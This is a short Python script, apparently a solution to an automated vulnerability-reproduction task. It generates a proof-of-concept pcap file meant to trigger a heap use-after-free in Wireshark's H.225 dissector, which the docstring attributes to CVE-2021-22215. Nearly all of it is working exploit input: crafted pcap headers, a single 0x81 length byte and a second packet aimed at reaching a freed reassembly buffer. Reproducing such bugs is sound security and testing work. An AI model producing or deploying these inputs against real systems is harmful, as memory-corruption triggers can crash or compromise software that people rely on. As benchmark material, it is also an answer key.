import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a Heap Use After Free
        vulnerability in the h225 dissector.

        The vulnerability (CVE-2021-22215) occurs because the reassembly state
        (next_tvb) is not initialized between dissecting two packets in
        different conversations. This allows state from a first packet that
        initiates reassembly to persist. A second packet can then cause the
        dissector to use a stale pointer to a freed buffer from the first
        packet's dissection context.

        The PoC creates a pcap file with two packets:
        1. The pcap uses a raw link-layer type for H.225 RAS messages
           (WTAP_ENCAP_H225_RAS = 163) to keep the PoC small by avoiding
           network headers (Eth/IP/UDP).
        2. The first packet contains a single byte, 0x81. In ASN.1 PER, this
           is an unconstrained length determinant indicating the length is
           in the following byte. Since the packet ends here, the dissector
           initiates reassembly logic, allocating a buffer for the fragment.
           This buffer is freed after the packet is processed.
        3. The second packet arrives. The dissector, due to the bug, does not
           re-initialize the reassembly context. It attempts to append the
           second packet's data to the now-freed buffer from the first packet,
           triggering a heap-use-after-free.
        """

        # PCAP Global Header (24 bytes)
        # magic_number: 0xa1b2c3d4 (for little-endian file)
        # version_major: 2, version_minor: 4
        # snaplen: 65535
        # network: 163 (WTAP_ENCAP_H225_RAS)
        global_header = struct.pack(
            '<IHHIIII',
            0xa1b2c3d4,
            2,
            4,
            0,
            0,
            65535,
            163
        )

        # Packet 1 Record: Header (16 bytes) + Data (1 byte)
        pkt1_header = struct.pack(
            '<IIII',
            0,  # ts_sec
            0,  # ts_usec
            1,  # incl_len
            1   # orig_len
        )
        pkt1_data = b'\x81'

        # Packet 2 Record: Header (16 bytes) + Data (16 bytes)
        pkt2_header = struct.pack(
            '<IIII',
            0,   # ts_sec
            1,   # ts_usec (slightly later)
            16,  # incl_len
            16   # orig_len
        )
        pkt2_data = b'\x00' * 16

        # Concatenate all parts to form the PoC file
        # Total length = 24 + 16 + 1 + 16 + 16 = 73 bytes
        poc = global_header + pkt1_header + pkt1_data + pkt2_header + pkt2_data
        
        return poc